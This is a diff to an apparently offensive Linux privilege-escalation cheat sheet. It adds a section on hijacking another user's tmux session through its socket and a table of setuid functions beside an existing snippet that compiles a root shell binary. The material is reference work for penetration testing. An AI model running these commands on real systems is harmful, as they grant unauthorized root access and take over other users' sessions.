@@ -41,6 +41,7 @@
 * [Groups](#groups)
     * [Docker](#docker)
     * [LXC/LXD](#lxclxd)
+* [Hijack TMUX session](#hijack-tmux-session)
 * [Kernel Exploits](#kernel-exploits)
     * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
     * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
@@ -328,6 +329,13 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 
 ### Create a SUID binary
 
+| Function   | Description  |
+|------------|---|
+| setreuid() | sets real and effective user IDs of the calling process  |
+| setuid()   | sets the effective user ID of the calling process        |
+| setgid()   | sets the effective group ID of the calling process       |
+
+
 ```bash
 print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
 gcc -o /tmp/suid /tmp/suid.c  
@@ -340,7 +348,7 @@ sudo chmod +s /tmp/suid # setuid bit
 
 ### List capabilities of binaries 
 
-```bash
+```powershell
 ╭─swissky@lab ~  
 ╰─$ /usr/bin/getcap -r  /usr/bin
 /usr/bin/fping                = cap_net_raw+ep
@@ -736,6 +744,17 @@ lxc exec mycontainer /bin/sh
 ```
 
 Alternatively https://github.com/initstring/lxd_root
+
+
+## Hijack TMUX session
+
+Require a read access to the tmux socket : `/tmp/tmux-1000/default`.
+
+```powershell
+export TMUX=/tmp/tmux-1000/default,1234,0 
+tmux ls
+```
+
 
 ## Kernel Exploits
 
